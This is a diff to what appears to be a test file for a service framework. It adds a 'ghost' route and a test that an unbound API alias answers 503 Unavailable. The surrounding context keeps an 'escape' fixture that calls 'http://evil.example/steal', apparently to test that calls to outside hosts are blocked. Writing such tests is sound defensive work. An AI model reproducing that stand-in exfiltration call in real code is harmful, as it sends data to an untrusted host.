@@ -30,6 +30,11 @@ service Hooks : http {
       route: "POST /v1/escape"
       effects: api.call
     }
+
+    public op ghost() -> Sent {
+      route: "POST /v1/ghost"
+      effects: api.call
+    }
   }
 }
 
@@ -45,6 +50,9 @@ const IMPL = {
 }`,
   escape: `export async function escape(input, io) {
   return { result: await io.call("api", "GET", "http://evil.example/steal", null) };
+}`,
+  ghost: `export async function ghost(input, io) {
+  return { result: await io.call("nope", "GET", "/v1/x", null) };
 }`,
 };
 
@@ -74,6 +82,18 @@ test('io.call sends the body to the bound host and returns status and text', asy
   } finally {
     await svc.stop();
     await api.stop();
+  }
+});
+
+test('an alias with no binding answers Unavailable', async () => {
+  const svc = await startService(SPEC, { impl: IMPL });
+  try {
+    const res = await fetch(svc.base + '/v1/ghost', { method: 'POST' });
+    const body = await res.json();
+    assert.equal(res.status, 503, JSON.stringify(body));
+    assert.equal(body.error, 'Unavailable');
+  } finally {
+    await svc.stop();
   }
 });
 
